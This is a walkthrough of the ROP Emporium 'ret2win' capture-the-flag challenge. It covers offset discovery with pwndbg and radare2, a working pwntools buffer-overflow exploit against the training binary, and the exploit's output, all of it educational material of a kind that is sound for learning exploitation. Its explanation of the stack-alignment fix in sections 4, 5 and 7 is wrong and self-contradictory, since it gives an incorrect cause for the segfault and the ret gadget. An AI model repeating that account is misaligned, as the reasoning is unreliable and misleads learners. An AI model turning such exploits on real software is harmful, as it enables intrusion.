
# ret2win - ROP Emporium Walkthrough

![ROP Emporium](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Features/Base/src/main/resources/images/GHIDRA_3.png?raw=true)

## Introduction

**ret2win** is the first challenge in the [ROP Emporium](https://ropemporium.com/) series. It's the perfect introduction to Return Oriented Programming. The goal is simple: redirect execution to a function called `ret2win()` that prints the flag.

### Key Concepts
- Basic buffer overflow
- Controlling the return address
- Calling a hidden function
- Stack alignment with ROP

---

## 1. Binary Analysis

### Basic Information

```bash
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=ret2win
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

The binary is **64-bit**, **no stack canary**, **no PIE** — classic buffer overflow scenario. NX is enabled, so we can't execute shellcode on the stack, but we don't need to — we'll just return to an existing function.

### Interesting Functions

Using `radare2`, let's list the functions:

```bash
[0x004005b0]> afl
0x004006e8    1    110 sym.pwnme
0x00400756    1     27 sym.ret2win
0x00400697    1     81 main
...
```

We have two interesting functions:
- `pwnme()` at **`0x4006e8`** — contains the buffer overflow
- `ret2win()` at **`0x400756`** — our target, prints the flag

### Looking at `ret2win()`

```bash
[0x00400756]> pdd
void ret2win (void) {
    puts("Well done! Here's your flag:");
    system("/bin/cat flag.txt");
}
```

This is exactly what we want to call!

---

## 2. Finding the Offset with pwndbg

We need to find how many bytes until we control the return address.

### Load the binary in pwndbg

```bash
pwndbg ./ret2win
```

### Generate a cyclic pattern

```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

### Run and crash

```bash
pwndbg> run
# ... program asks for input, paste the pattern ...
```

### Analyze the crash

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400755 in pwnme ()
...
RBP  0x6161616161616165 ('eaaaaaaa')
RSP  0x7fffffffd9d8 ◂— 0x6161616161616166 ('faaaaaaa')
RIP  0x400755 (pwnme+109) ◂— ret
```

### Find the exact offset

```bash
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

**Offset = 40 bytes** before we control the return address.

---

## 3. Understanding pwnme()

Let's look at the vulnerable function:

```bash
[0x004006e8]> pdf
┌ 110: sym.pwnme ();
│           0x004006e8      55             push rbp
│           0x004006e9      4889e5         mov rbp, rsp
│           0x004006ec      4883ec20       sub rsp, 0x20
│           0x004006f0      488d45e0       lea rax, [buf]
│           0x004006f4      ba20000000     mov edx, 0x20               ; 32
│           0x004006f9      be00000000     mov esi, 0
│           0x004006fe      4889c7         mov rdi, rax
│           0x00400701      e87afeffff     call sym.imp.memset
│           ... print statements ...
│           0x00400733      488d45e0       lea rax, [buf]
│           0x00400737      ba38000000     mov edx, 0x38               ; 56
│           0x0040073c      4889c6         mov rsi, rax
│           0x0040073f      bf00000000     mov edi, 0
│           0x00400744      e847feffff     call sym.imp.read
│           0x00400749      bf1b094000     mov edi, str.Thank_you_
│           0x0040074e      e8fdfdffff     call sym.imp.puts
│           0x00400753      90             nop
│           0x00400754      c9             leave
└           0x00400755      c3             ret
```

Key observations:
- Buffer is allocated on the stack: `sub rsp, 0x20` (32 bytes)
- `read()` reads **56 bytes** (`0x38`) into this 32-byte buffer
- That's a **24-byte overflow** (56 - 32 = 24)
- But we need 40 bytes to reach return address:

```
Buffer: 32 bytes
Saved RBP: 8 bytes
Return address: 8 bytes
Total to overwrite return address = 32 + 8 = 40 bytes ✓
```

---

## 4. The Stack Alignment Problem

When we first tried to jump directly to `ret2win()`:

```python
payload = b'A'*40 + p64(0x400756)
```

We got:
```
Thank you!
Well done! Here's your flag:
[segfault before flag appears]
```

**Why?** When `ret2win()` finishes, it executes a `ret` instruction and tries to pop the next address from the stack. But our stack contains garbage → segfault before the flag is printed.

---

## 5. The Solution: Stack Alignment with a `ret` Gadget

We need to give `ret2win()` a valid return address. The solution is to add a `ret` gadget before calling `ret2win()`:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './ret2win'

ret2win_addr = 0x400756
ret_gadget = 0x40053e      # Simple "ret" instruction found in the binary

offset = 40

payload = flat([
    b'A' * offset,
    ret_gadget,      # Aligns the stack
    ret2win_addr     # Then call ret2win
])

io = process('./ret2win')
io.sendline(payload)
print(io.recvall().decode())
```

### Why This Works

```
Stack: [junk][ret_gadget][ret2win_addr]

1. ret from pwnme → pops ret_gadget → executes ret (does nothing)
2. next ret → pops ret2win_addr → jumps to ret2win
3. ret2win runs, prints flag
4. ret from ret2win → pops next address (now it's the end of stack, but we've already printed the flag)
```

The extra `ret` gadget aligns the stack and prevents the segfault before the flag is printed.

---

## 6. Execution

```bash
$ python3 exploit.py
[*] '/home/kali/revers/personelle/fun/ret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Starting local process './ret2win': pid 2988
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

**Flag obtained:** `ROPE{a_placeholder_32byte_flag!}`

---

## 7. Detailed Explanation

### Why 40 Bytes?

From the stack layout:
- **Buffer**: 32 bytes (`sub rsp, 0x20`)
- **Saved RBP**: 8 bytes (pushed at function prologue)
- **Return address**: 8 bytes

Total to reach return address = 32 + 8 = **40 bytes**

Our 41st-48th bytes overwrite the return address.

### Why a `ret` Gadget?

When a function ends with `ret`, it pops the top of the stack and jumps there. By placing `ret2win_addr` on the stack, we redirect execution. But when `ret2win()` itself ends, it tries to pop **another** address. If that address is invalid → segfault.

By adding a `ret` gadget before `ret2win_addr`:
- The first `ret` (from pwnme) pops the `ret_gadget` and executes it
- The `ret_gadget` does nothing but consume itself from the stack
- The next `ret` pops `ret2win_addr` and jumps to it
- When `ret2win()` ends, the stack is empty but the flag is already printed

### Stack Visualization

```
Stack: [junk][ret_gadget][ret2win_addr]

Step 1: ret from pwnme
        → pop ret_gadget (0x40053e)
        → execute ret (does nothing)
        → RSP now points to ret2win_addr

Step 2: ret from gadget
        → pop ret2win_addr (0x400756)
        → jump to ret2win()

Step 3: ret2win() executes
        → prints "Well done! Here's your flag:"
        → system("/bin/cat flag.txt") → prints flag

Step 4: ret from ret2win()
        → tries to pop next address
        → but we don't care, flag is already printed
```

---

## 8. What We Learned

- **Basic buffer overflow** on x64
- **Finding the offset** with cyclic patterns
- **Controlling the return address** to redirect execution
- **Stack alignment** issues and solutions with `ret` gadgets
- **Clean program flow** with ROP

This is the foundation for all ROP challenges. The next challenges (split, callme, write4) build on these concepts by adding arguments and multiple function calls.

---

## Resources

- [ROP Emporium - ret2win](https://ropemporium.com/challenge/ret2win.html)
- [pwntools documentation](https://docs.pwntools.com/)
- [radare2 book](https://radare.gitbooks.io/radare2book/content/)
- [pwndbg](https://github.com/pwndbg/pwndbg)

---

*scaramouch*
